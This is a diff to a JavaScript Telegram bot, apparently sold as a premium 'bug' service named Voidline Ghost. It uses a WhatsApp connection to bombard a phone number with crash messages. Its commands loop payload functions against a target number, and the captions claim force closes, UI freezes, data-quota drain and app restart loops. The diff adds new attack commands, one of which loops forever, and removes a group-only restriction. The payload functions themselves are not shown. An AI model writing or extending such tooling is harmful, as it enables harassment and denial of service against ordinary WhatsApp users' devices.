@@ -93,7 +93,7 @@ const {
     Header,
     viewOnceMessage,
     groupStatusMentionMessage,
-} = require('xatabail');
+} = require('baileys');
 const pino = require('pino');
 const crypto = require('crypto');
 const chalk = require('chalk');
@@ -206,8 +206,8 @@ try {
 
 
 const databaseUrl = 'https://raw.githubusercontent.com/rizkyyy02xi-sudo/zarrnotdev/main/tokens.json';
-const thumbnailUrl = "https://files.catbox.moe/0g3sya.mp4";
-const thumbnailUrl2 = "https://files.catbox.moe/0g3sya.mp4";
+const thumbnailUrl = "https://files.catbox.moe/4h2dca.jpg";
+const thumbnailUrl2 = "https://files.catbox.moe/linbl0.jpg";
 
 function createSafeSock(sock) {
   let sendCount = 0
@@ -1557,7 +1557,7 @@ bot.start(async (ctx) => {
 
     const menuMessage = `  
 (⸙) ɦเ เɱ νσι∂ℓιηє gнσѕт
-<blockquote>{VðïÐïlïñê Ghð§†} Olaa ${userTag}</blockquote>
+<blockquote>🌙 RAMADHAN 1447H 🌙</blockquote>
 ᴛᴇʀɪᴍᴀᴋᴀꜱɪʜ ᴛᴇʟᴀʜ ꜱᴇᴛɪᴀ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ᴠᴏɪᴅʟɪɴᴇ ɢʜᴏꜱᴛ. 
 ꜱᴇʟᴀʟᴜ ɴᴀɴᴛɪᴋᴀɴ, ɪɴꜰᴏ, ᴘʀᴏᴊᴇᴄᴛ ᴅᴀʀɪ ᴋᴀᴍɪ⎙
 <blockquote>⬡═―⊱ ⎧ 𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽 ⎭ ⊰—═⬡</blockquote>
@@ -1568,8 +1568,9 @@ bot.start(async (ctx) => {
 ◉ ʀᴜɴᴛɪᴍᴇ : ${runtimeStatus}
 ◉ ᴀᴄᴄᴇꜱꜱ : ${premiumStatus}  
 ◉ ꜱᴛᴀᴛᴜꜱ ꜱᴇɴᴅᴇʀ : ${senderStatus} 
+◉ ᴜsᴇʀɴᴀᴍᴇ : ${userTag}
 ◉ ᴜꜱᴇʀ-ɪᴅ : ${senderId}
-<blockquote>ⓘ 𝚂𝚎𝚕𝚕𝚎𝚌𝚝 𝚃𝚑𝚎 𝙼𝚎𝚗𝚞 𝙱𝚞𝚝𝚝𝚘𝚗 𝙱𝚎𝚕𝚘𝚠</blockquote> 
+<blockquote>🤲 RAMADHAN KAREEM 🤲</blockquote> 
 `;  
 
     const keyboard = [
@@ -1611,7 +1612,7 @@ bot.action('/start', async (ctx) => {
   
     const menuMessage = `
 (⸙) ɦเ เɱ νσι∂ℓιηє gнσѕт
-<blockquote>{VðïÐïlïñê Ghð§†} Olaa ${userTag}</blockquote>
+<blockquote>🌙 RAMADHAN 1447H 🌙</blockquote>
 ᴛᴇʀɪᴍᴀᴋᴀꜱɪʜ ᴛᴇʟᴀʜ ꜱᴇᴛɪᴀ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ᴠᴏɪᴅʟɪɴᴇ ɢʜᴏꜱᴛ. 
 ꜱᴇʟᴀʟᴜ ɴᴀɴᴛɪᴋᴀɴ, ɪɴꜰᴏ, ᴘʀᴏᴊᴇᴄᴛ ᴅᴀʀɪ ᴋᴀᴍɪ⎙
 <blockquote>⬡═―⊱ ⎧ 𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽 ⎭ ⊰—═⬡</blockquote>
@@ -1623,7 +1624,8 @@ bot.action('/start', async (ctx) => {
 ◉ ᴀᴄᴄᴇꜱꜱ : ${premiumStatus}  
 ◉ ꜱᴛᴀᴛᴜꜱ ꜱᴇɴᴅᴇʀ : ${senderStatus} 
 ◉ ᴜꜱᴇʀ-ɪᴅ : ${senderId}
-<blockquote>ⓘ 𝚂𝚎𝚕𝚕𝚎𝚌𝚝 𝚃𝚑𝚎 𝙼𝚎𝚗𝚞 𝙱𝚞𝚝𝚝𝚘𝚗 𝙱𝚎𝚕𝚘𝚠</blockquote> 
+◉ ᴜsᴇʀɴᴀᴍᴇ : ${userTag}
+<blockquote>🤲 RAMADHAN KAREEM 🤲</blockquote> 
 `;
 
     const keyboard = [
@@ -1741,6 +1743,8 @@ bot.action('/bug', async (ctx) => {
 ╰⊱ |[ Delay Invisible Hard ]|
 ⌬ /xdocu ✆ 628xx
 ╰⊱ |[ Delay For Murbug ]|
+⌬ /xbuldo ✆ 628xx
+╰⊱ |[ Buldozer Sedot Kuota ]|
 ⌬ /xblank ✆ 628xx
 ╰⊱ |[ Blank Chat Andro ]|
 ⌬ /xplor ✆ 628xx
@@ -1751,6 +1755,8 @@ bot.action('/bug', async (ctx) => {
 ╰⊱ |[ Fc For Murbug ]|
 ⌬ /xcrash ✆ 628xx
 ╰⊱ |[ Crash Invisible Android ]|
+⌬ /xspam ✆ 628xx
+╰⊱ |[ Crash Bebas Spam ]|
 ⌬ /forcex ✆ 628xx
 ╰⊱ |[ Forclose X Delay ]|
 ⌬ /ioskill ✆ 628xx
@@ -1859,77 +1865,51 @@ bot.action('/tqto', async (ctx) => {
     }
 });
 
-bot.command("overdelay", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
-
-  if (!checkGroupOnly(ctx)) return;
+bot.command("xoverdelay", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
 
   const q = ctx.message.text.split(" ")[1];
-  if (!q) return ctx.reply(`🪧 ☇ Format: /overdelay 62×××`);
+  if (!q) return ctx.reply(`🪧 ☇ Format: /xoverdelay 62×××`);
   let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
   let mention = true;
 
   const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
-    caption: `<pre>╭═―⊱ ⎧ VOIDLINE GHOST ⎭ ⊰―═⬡
-│⌑ Target: ${q}
-│⌑ Type: Delay Invisible Hard
-│⌑ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
-│⌑ Progress: ${progressBar(0)}
-╰─────────────────────═⬡</pre>`,
+    caption: `
+<blockquote><b> ⬡═―—⊱ ⎧ 𝗩𝗢𝗜𝗗𝗟𝗜𝗡𝗘 𝗚𝗛𝗢𝗦𝗧 ⎭ ⊰―—═⬡ 
+⛧ Target: ${q}
+⛧ Type: Delay Invisible Hard
+⛧ Status: Process
+(🍁) Voidline Ghost</b></blockquote>`,
     parse_mode: "HTML",
     reply_markup: {
       inline_keyboard: [[
-        { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}` }
+        { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
       ]]
     }
   });
 
   const processMessageId = processMessage.message_id;
 
-  for (let p = 10; p <= 100; p += 10) {
-    await sleep(600);
-    await ctx.telegram.editMessageCaption(
-      ctx.chat.id,
-      processMessageId,
-      undefined,
-      `<pre>╭═―⊱ ⎧ VOIDLINE GHOST ⎭ ⊰―═⬡
-│⌑ Target: ${q}
-│⌑ Type: Delay Invisible Hard
-│⌑ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
-│⌑ Progress: ${progressBar(p)}
-╰─────────────────────═⬡</pre>`,
-      { parse_mode: "HTML" }
-    );
+  for (let i = 0; i < 8; i++) {
+    await CStatus(sock, target);
+    await sleep(1000);
   }
 
-  for (let i = 0; i < 1000000000000000; i++) {
-    await BlankSawit(sock, target);
-    await LocaInvis(sock, target);
-  }
-
-  await ctx.telegram.editMessageCaption(
-    ctx.chat.id,
-    processMessageId,
-    undefined,
-    `<pre>╭═―⊱ ⎧ VOIDLINE GHOST ⎭ ⊰―═⬡
-│⌑ Target: ${q}
-│⌑ Type: Delay Invisible Hard
-│⌑ Status: 𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺
-│⌑ Progress: ${progressBar(100)}
-╰─────────────────────═⬡</pre>`,
-    {
-      parse_mode: "HTML",
-      reply_markup: {
-        inline_keyboard: [[
-          { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}` }
-        ]]
-      }
+  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
+<blockquote><b> ⬡═―—⊱ ⎧ 𝗩𝗢𝗜𝗗𝗟𝗜𝗡𝗘 𝗚𝗛𝗢𝗦𝗧 ⎭ ⊰―—═⬡ 
+⛧ Target: ${q}
+⛧ Type: Delay Invisible Hard
+⛧ Status: Success
+(🍁) Voidline Ghost</b></blockquote>`, {
+    parse_mode: "HTML",
+    reply_markup: {
+      inline_keyboard: [[
+        { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
+      ]]
     }
-  );
+  });
 });
 
 bot.command("xblank", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
-
-  if (!checkGroupOnly(ctx)) return;
 
   const q = ctx.message.text.split(" ")[1];
   if (!q) return ctx.reply(`🪧 ☇ Format: /xblank 62×××`);
@@ -1937,66 +1917,43 @@ bot.command("xblank", checkWhatsAppConnection, checkPremium, checkCooldown, asyn
   let mention = true;
 
   const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
-    caption: `<pre>╭═―⊱ ⎧ VOIDLINE GHOST ⎭ ⊰―═⬡
-│⌑ Target: ${q}
-│⌑ Type: Blank Chat Android 
-│⌑ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
-│⌑ Progress: ${progressBar(0)}
-╰─────────────────────═⬡</pre>`,
+    caption: `
+<blockquote><b> ⬡═―—⊱ ⎧ 𝗩𝗢𝗜𝗗𝗟𝗜𝗡𝗘 𝗚𝗛𝗢𝗦𝗧 ⎭ ⊰―—═⬡ 
+⛧ Target: ${q}
+⛧ Type: Blank Chat Andro
+⛧ Status: Process
+(🍁) Voidline Ghost</b></blockquote>`,
     parse_mode: "HTML",
     reply_markup: {
       inline_keyboard: [[
-        { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}` }
+        { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
       ]]
     }
   });
 
   const processMessageId = processMessage.message_id;
 
-  for (let p = 10; p <= 100; p += 10) {
-    await sleep(600);
-    await ctx.telegram.editMessageCaption(
-      ctx.chat.id,
-      processMessageId,
-      undefined,
-      `<pre>╭═―⊱ ⎧ VOIDLINE GHOST ⎭ ⊰―═⬡
-│⌑ Target: ${q}
-│⌑ Type: Blank Chat Android 
-│⌑ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
-│⌑ Progress: ${progressBar(p)}
-╰─────────────────────═⬡</pre>`,
-      { parse_mode: "HTML" }
-    );
-  }
-
   for (let i = 0; i < 100; i++) {
     await BlankSawit(sock, target);
+    await sleep(1000);
   }
 
-  await ctx.telegram.editMessageCaption(
-    ctx.chat.id,
-    processMessageId,
-    undefined,
-    `<pre>╭═―⊱ ⎧ VOIDLINE GHOST ⎭ ⊰―═⬡
-│⌑ Target: ${q}
-│⌑ Type: Blank Chat Android 
-│⌑ Status: 𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺
-│⌑ Progress: ${progressBar(100)}
-╰─────────────────────═⬡</pre>`,
-    {
-      parse_mode: "HTML",
-      reply_markup: {
-        inline_keyboard: [[
-          { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}` }
-        ]]
-      }
+  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
+<blockquote><b> ⬡═―—⊱ ⎧ 𝗩𝗢𝗜𝗗𝗟𝗜𝗡𝗘 𝗚𝗛𝗢𝗦𝗧 ⎭ ⊰―—═⬡ 
+⛧ Target: ${q}
+⛧ Type: Blank Chat Andro
+⛧ Status: Success
+(🍁) Voidline Ghost</b></blockquote>`, {
+    parse_mode: "HTML",
+    reply_markup: {
+      inline_keyboard: [[
+        { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
+      ]]
     }
-  );
+  });
 });
 
 bot.command("xdocu", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
-
-  if (!checkGroupOnly(ctx)) return;
 
   const q = ctx.message.text.split(" ")[1];
   if (!q) return ctx.reply(`🪧 ☇ Format: /xdocu 62×××`);
@@ -2004,67 +1961,88 @@ bot.command("xdocu", checkWhatsAppConnection, checkPremium, checkCooldown, async
   let mention = true;
 
   const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
-    caption: `<pre>╭═―⊱ ⎧ VOIDLINE GHOST ⎭ ⊰―═⬡
-│⌑ Target: ${q}
-│⌑ Type: Delay For Murbug 
-│⌑ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
-│⌑ Progress: ${progressBar(0)}
-╰─────────────────────═⬡</pre>`,
+    caption: `
+<blockquote><b> ⬡═―—⊱ ⎧ 𝗩𝗢𝗜𝗗𝗟𝗜𝗡𝗘 𝗚𝗛𝗢𝗦𝗧 ⎭ ⊰―—═⬡ 
+⛧ Target: ${q}
+⛧ Type: Delay For Murbug
+⛧ Status: Process
+(🍁) Voidline Ghost</b></blockquote>`,
     parse_mode: "HTML",
     reply_markup: {
       inline_keyboard: [[
-        { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}` }
+        { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
       ]]
     }
   });
 
   const processMessageId = processMessage.message_id;
 
-  for (let p = 10; p <= 100; p += 10) {
-    await sleep(600);
-    await ctx.telegram.editMessageCaption(
-      ctx.chat.id,
-      processMessageId,
-      undefined,
-      `<pre>╭═―⊱ ⎧ VOIDLINE GHOST ⎭ ⊰―═⬡
-│⌑ Target: ${q}
-│⌑ Type: Delay For Murbug
-│⌑ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
-│⌑ Progress: ${progressBar(p)}
-╰─────────────────────═⬡</pre>`,
-      { parse_mode: "HTML" }
-    );
+  for (let i = 0; i < 8; i++) {
+    await CStatus(sock, target);
+    await sleep(1000);
   }
 
-  for (let i = 0; i < 1000000000000000; i++) {
-    await LocaInvis(sock, target);
-    await BlankSawit(sock, target);
-  }
-
-  await ctx.telegram.editMessageCaption(
-    ctx.chat.id,
-    processMessageId,
-    undefined,
-    `<pre>╭═―⊱ ⎧ VOIDLINE GHOST ⎭ ⊰―═⬡
-│⌑ Target: ${q}
-│⌑ Type: Delay For Murbug
-│⌑ Status: 𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺
-│⌑ Progress: ${progressBar(100)}
-╰─────────────────────═⬡</pre>`,
-    {
-      parse_mode: "HTML",
-      reply_markup: {
-        inline_keyboard: [[
-          { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}` }
-        ]]
-      }
+  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
+<blockquote><b> ⬡═―—⊱ ⎧ 𝗩𝗢𝗜𝗗𝗟𝗜𝗡𝗘 𝗚𝗛𝗢𝗦𝗧 ⎭ ⊰―—═⬡ 
+⛧ Target: ${q}
+⛧ Type: Delay For Murbug
+⛧ Status: Success
+(🍁) Voidline Ghost</b></blockquote>`, {
+    parse_mode: "HTML",
+    reply_markup: {
+      inline_keyboard: [[
+        { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
+      ]]
     }
-  );
+  });
 });
 
-bot.command("xplor", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
+bot.command("xbuldo", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
 
-  if (!checkGroupOnly(ctx)) return;
+  const q = ctx.message.text.split(" ")[1];
+  if (!q) return ctx.reply(`🪧 ☇ Format: /xbuldo 62×××`);
+  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+  let mention = true;
+
+  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
+    caption: `
+<blockquote><b> ⬡═―—⊱ ⎧ 𝗩𝗢𝗜𝗗𝗟𝗜𝗡𝗘 𝗚𝗛𝗢𝗦𝗧 ⎭ ⊰―—═⬡ 
+⛧ Target: ${q}
+⛧ Type: Buldozer Sedot Kuota
+⛧ Status: Process
+(🍁) Voidline Ghost</b></blockquote>`,
+    parse_mode: "HTML",
+    reply_markup: {
+      inline_keyboard: [[
+        { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
+      ]]
+    }
+  });
+
+  const processMessageId = processMessage.message_id;
+
+  for (let i = 0; i < 100; i++) {
+    await BlankSawit(sock, target);
+    await sleep(1000);
+  }
+
+  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
+<blockquote><b> ⬡═―—⊱ ⎧ 𝗩𝗢𝗜𝗗𝗟𝗜𝗡𝗘 𝗚𝗛𝗢𝗦𝗧 ⎭ ⊰―—═⬡ 
+⛧ Target: ${q}
+⛧ Type: Buldozer Sedot Kuota
+⛧ Status: Success
+(🍁) Voidline Ghost</b></blockquote>`, {
+    parse_mode: "HTML",
+    reply_markup: {
+      inline_keyboard: [[
+        { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
+      ]]
+    }
+  });
+});
+
+
+bot.command("xplor", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
 
   const q = ctx.message.text.split(" ")[1];
   if (!q) return ctx.reply(`🪧 ☇ Format: /xplor 62×××`);
@@ -2072,57 +2050,89 @@ bot.command("xplor", checkWhatsAppConnection, checkPremium, checkCooldown, async
   let mention = true;
 
   const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
-    caption: `<pre>╭═―⊱ ⎧ VOIDLINE GHOST ⎭ ⊰―═⬡
-│⌑ Target: ${q}
-│⌑ Type: Blank Chat Ios
-│⌑ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
-│⌑ Progress: ${progressBar(0)}
-╰─────────────────────═⬡</pre>`,
+    caption: `
+<blockquote><b> ⬡═―—⊱ ⎧ 𝗩𝗢𝗜𝗗𝗟𝗜𝗡𝗘 𝗚𝗛𝗢𝗦𝗧 ⎭ ⊰―—═⬡ 
+⛧ Target: ${q}
+⛧ Type: Blank Chat Ios
+⛧ Status: Process
+(🍁) Voidline Ghost</b></blockquote>`,
     parse_mode: "HTML",
     reply_markup: {
       inline_keyboard: [[
-        { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}` }
+        { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
       ]]
     }
   });
 
   const processMessageId = processMessage.message_id;
 
-  for (let p = 10; p <= 100; p += 10) {
-    await sleep(600);
-    await ctx.telegram.editMessageCaption(
-      ctx.chat.id,
-      processMessageId,
-      undefined,
-      `<pre>╭═―⊱ ⎧ VOIDLINE GHOST ⎭ ⊰―═⬡
-│⌑ Target: ${q}
-│⌑ Type: Blank Chat Ios
-│⌑ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
-│⌑ Progress: ${progressBar(p)}
-╰─────────────────────═⬡</pre>`,
-      { parse_mode: "HTML" }
-    );
-  }
-
   for (let i = 0; i < 100; i++) {
     await BlankSawit(sock, target);
+    await sleep(1000);
   }
 
-  await ctx.telegram.editMessageCaption(
-    ctx.chat.id,
-    processMessageId,
-    undefined,
-    `<pre>╭═―⊱ ⎧ VOIDLINE GHOST ⎭ ⊰―═⬡
-│⌑ Target: ${q}
-│⌑ Type: Blank Chat Ios
-│⌑ Status: 𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺
-│⌑ Progress: ${progressBar(100)}
-╰─────────────────────═⬡</pre>`,
+  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
+<blockquote><b> ⬡═―—⊱ ⎧ 𝗩𝗢𝗜𝗗𝗟𝗜𝗡𝗘 𝗚𝗛𝗢𝗦𝗧 ⎭ ⊰―—═⬡ 
+⛧ Target: ${q}
+⛧ Type: Blank Chat Ios
+⛧ Status: Success
+(🍁) Voidline Ghost</b></blockquote>`, {
+    parse_mode: "HTML",
+    reply_markup: {
+      inline_keyboard: [[
+        { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
+      ]]
+    }
+  });
+});
+
+bot.command("xspam", checkWhatsAppConnection, checkPremium, async (ctx) => {
+  const q = ctx.message?.text?.split(" ")[1];
+  if (!q) return ctx.reply(`🪧 ☇ Format: /xspam 62×××`);
+
+  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+  const processMessage = await ctx.reply(
+`\`\`\`js
+⬡═―—⊱ ⎧ Voidline Ghost ⎭ ⊰―—═⬡
+⌑ Target: ${q}
+⌑ Type: Crash Murbug
+⌑ Status: Sending…
+\`\`\``,
     {
       parse_mode: "HTML",
       reply_markup: {
         inline_keyboard: [[
-          { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}` }
+          { text: "⌜📱⌟ Target", url: `https://wa.me/${q}` }
+        ]]
+      }
+    }
+  );
+
+  while (true) {
+  await Infinity(sock, target);
+    await sleep(1000);
+  }
+
+  await ctx.telegram.editMessageText(
+    ctx.chat.id,
+    processMessage.message_id,
+    undefined,
+`\`\`\`js
+⬡═―—⊱ ⎧ Voidline Ghost ⎭ ⊰―—═⬡
+⌑ Target   : ${q}
+⌑ Result   : Delivered
+⌑ Effect   :
+• Force Close (Invisible)
+• UI Freeze (Android)
+• App Restart Loop
+• Force Close (Android/I-Phone)
+⌑ Status   : Executed Successfully
+\`\`\``,
+    {
+      parse_mode: "HTML",
+      reply_markup: {
+        inline_keyboard: [[
+          { text: "⌜📱⌟ ☇ Target", url: `https://wa.me/${q}` }
         ]]
       }
     }
@@ -2131,74 +2141,49 @@ bot.command("xplor", checkWhatsAppConnection, checkPremium, checkCooldown, async
 
 bot.command("xpler", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
 
-  if (!checkGroupOnly(ctx)) return;
-
   const q = ctx.message.text.split(" ")[1];
   if (!q) return ctx.reply(`🪧 ☇ Format: /xpler 62×××`);
   let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
   let mention = true;
 
   const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
-    caption: `<pre>╭═―⊱ ⎧ VOIDLINE GHOST ⎭ ⊰―═⬡
-│⌑ Target: ${q}
-│⌑ Type: Forclose Bebas Spam
-│⌑ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
-│⌑ Progress: ${progressBar(0)}
-╰─────────────────────═⬡</pre>`,
+    caption: `
+<blockquote><b> ⬡═―—⊱ ⎧ 𝗩𝗢𝗜𝗗𝗟𝗜𝗡𝗘 𝗚𝗛𝗢𝗦𝗧 ⎭ ⊰―—═⬡ 
+⛧ Target: ${q}
+⛧ Type: Fc Bebas Spam
+⛧ Status: Process
+(🍁) Voidline Ghost</b></blockquote>`,
     parse_mode: "HTML",
     reply_markup: {
       inline_keyboard: [[
-        { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}` }
+        { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
       ]]
     }
   });
 
   const processMessageId = processMessage.message_id;
 
-  for (let p = 10; p <= 100; p += 10) {
-    await sleep(600);
-    await ctx.telegram.editMessageCaption(
-      ctx.chat.id,
-      processMessageId,
-      undefined,
-      `<pre>╭═―⊱ ⎧ VOIDLINE GHOST ⎭ ⊰―═⬡
-│⌑ Target: ${q}
-│⌑ Type: Forclose Bebas Spam
-│⌑ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
-│⌑ Progress: ${progressBar(p)}
-╰─────────────────────═⬡</pre>`,
-      { parse_mode: "HTML" }
-    );
-  }
-
   for (let i = 0; i < 20; i++) {
     await Y9X(target);
+    await sleep(1000);
   }
 
-  await ctx.telegram.editMessageCaption(
-    ctx.chat.id,
-    processMessageId,
-    undefined,
-    `<pre>╭═―⊱ ⎧ VOIDLINE GHOST ⎭ ⊰―═⬡
-│⌑ Target: ${q}
-│⌑ Type: Forclose Bebas Spam
-│⌑ Status: 𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺
-│⌑ Progress: ${progressBar(100)}
-╰─────────────────────═⬡</pre>`,
-    {
-      parse_mode: "HTML",
-      reply_markup: {
-        inline_keyboard: [[
-          { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}` }
-        ]]
-      }
+  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
+<blockquote><b> ⬡═―—⊱ ⎧ 𝗩𝗢𝗜𝗗𝗟𝗜𝗡𝗘 𝗚𝗛𝗢𝗦𝗧 ⎭ ⊰―—═⬡ 
+⛧ Target: ${q}
+⛧ Type: Fc Bebas Spam Silahkan Bug Lagi
+⛧ Status: Success
+(🍁) Voidline Ghost</b></blockquote>`, {
+    parse_mode: "HTML",
+    reply_markup: {
+      inline_keyboard: [[
+        { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
+      ]]
     }
-  );
+  });
 });
 
 bot.command("forclose", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
-
-  if (!checkGroupOnly(ctx)) return;
 
   const q = ctx.message.text.split(" ")[1];
   if (!q) return ctx.reply(`🪧 ☇ Format: /forclose 62×××`);
@@ -2206,66 +2191,43 @@ bot.command("forclose", checkWhatsAppConnection, checkPremium, checkCooldown, as
   let mention = true;
 
   const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
-    caption: `<pre>╭═―⊱ ⎧ VOIDLINE GHOST ⎭ ⊰―═⬡
-│⌑ Target: ${q}
-│⌑ Type: Forclose For Murbug
-│⌑ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
-│⌑ Progress: ${progressBar(0)}
-╰─────────────────────═⬡</pre>`,
+    caption: `
+<blockquote><b> ⬡═―—⊱ ⎧ 𝗩𝗢𝗜𝗗𝗟𝗜𝗡𝗘 𝗚𝗛𝗢𝗦𝗧 ⎭ ⊰―—═⬡ 
+⛧ Target: ${q}
+⛧ Type: Fc For Murbug
+⛧ Status: Process
+(🍁) Voidline Ghost</b></blockquote>`,
     parse_mode: "HTML",
     reply_markup: {
       inline_keyboard: [[
-        { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}` }
+        { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
       ]]
     }
   });
 
   const processMessageId = processMessage.message_id;
 
-  for (let p = 10; p <= 100; p += 10) {
-    await sleep(600);
-    await ctx.telegram.editMessageCaption(
-      ctx.chat.id,
-      processMessageId,
-      undefined,
-      `<pre>╭═―⊱ ⎧ VOIDLINE GHOST ⎭ ⊰―═⬡
-│⌑ Target: ${q}
-│⌑ Type: Forclose For Murbug
-│⌑ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
-│⌑ Progress: ${progressBar(p)}
-╰─────────────────────═⬡</pre>`,
-      { parse_mode: "HTML" }
-    );
-  }
-
   for (let i = 0; i < 20; i++) {
     await Y9X(target);
+    await sleep(1000);
   }
 
-  await ctx.telegram.editMessageCaption(
-    ctx.chat.id,
-    processMessageId,
-    undefined,
-    `<pre>╭═―⊱ ⎧ VOIDLINE GHOST ⎭ ⊰―═⬡
-│⌑ Target: ${q}
-│⌑ Type: Forclose For Murbug
-│⌑ Status: 𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺
-│⌑ Progress: ${progressBar(100)}
-╰─────────────────────═⬡</pre>`,
-    {
-      parse_mode: "HTML",
-      reply_markup: {
-        inline_keyboard: [[
-          { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}` }
-        ]]
-      }
+  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
+<blockquote><b> ⬡═―—⊱ ⎧ 𝗩𝗢𝗜𝗗𝗟𝗜𝗡𝗘 𝗚𝗛𝗢𝗦𝗧 ⎭ ⊰―—═⬡ 
+⛧ Target: ${q}
+⛧ Type: Fc For Murbug Bebas Spam Lagi Nieh
+⛧ Status: Success
+(🍁) Voidline Ghost</b></blockquote>`, {
+    parse_mode: "HTML",
+    reply_markup: {
+      inline_keyboard: [[
+        { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
+      ]]
     }
-  );
+  });
 });
 
 bot.command("xcrash", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
-
-  if (!checkGroupOnly(ctx)) return;
 
   const q = ctx.message.text.split(" ")[1];
   if (!q) return ctx.reply(`🪧 ☇ Format: /xcrash 62×××`);
